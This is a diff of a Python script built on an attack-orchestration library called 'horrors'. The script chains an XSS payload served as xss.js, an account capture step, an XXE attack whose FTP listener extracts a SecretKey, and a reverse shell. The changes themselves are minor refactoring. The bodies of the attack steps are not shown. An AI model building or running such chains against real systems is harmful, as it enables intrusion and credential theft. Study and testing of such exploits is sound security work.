@@ -1,7 +1,5 @@
 #!/usr/bin/env python3
 
-import requests
-
 from horrors import (
     scenarios,
     services,
@@ -22,7 +20,7 @@ class PlantXSS(scenarios.Scene):
 
 class GetNewAccount(scenarios.Scene):
 
-    on_finish = 'userid'
+    next_event = 'userid'
 
     async def task(self):
         """Wait for `xss` state triggered when request path contains `xss.js`"""
@@ -68,20 +66,18 @@ if __name__ == "__main__":
 
     httpd = services.HTTPStatic()
     httpd.add_route('/', 'This is home page...')
-    httpd.add_route('/xss.js', open('xss.js').read().format(**context))
+    httpd.add_route('/xss.js', open('xss.js').read().format(context=context))
     httpd.add_route('/timestamp', services.HTTPStatic.timestamp)
     httpd.add_event('xss', when=events.PathContains('xss.js'))
 
     ftpd = services.FTPReader()
     ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', in_context='secret'))
 
-    story = scenarios.Scenario(keep_running=False, **context)
-    # story.set_proxy('http://127.0.0.1:8080')  # In case you'd like to watch it live
+    story = scenarios.Scenario(keep_running=False, context=context)
     story.add_service(httpd)
     story.add_service(ftpd)
     story.add_scene(PlantXSS)
     story.add_scene(GetNewAccount, when='xss')
     story.add_scene(SendXXE, when='userid')
     story.add_scene(ReverseShell, when='xxe')
-    # story.set_debug()
     story.play()
